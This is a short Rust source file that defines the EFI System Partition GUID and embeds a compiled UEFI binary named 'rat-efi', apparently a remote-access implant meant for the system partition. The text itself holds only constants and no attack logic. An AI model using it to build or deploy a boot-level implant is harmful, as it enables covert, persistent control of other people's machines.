use windows_sys::core::GUID;

pub const ESP_GUID: GUID = GUID {
    data1: 0xC12A7328,
    data2: 0xF81F,
    data3: 0x11D2,
    data4: [0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B],
};

#[cfg(debug_assertions)]
pub const EFI_APPLICATION: &[u8] =
    include_bytes!("../../rat-efi/target/x86_64-unknown-uefi/debug/rat-efi.efi");

#[cfg(not(debug_assertions))]
pub const EFI_APPLICATION: &[u8] =
    include_bytes!("../../rat-efi/target/x86_64-unknown-uefi/release/rat-efi.efi");
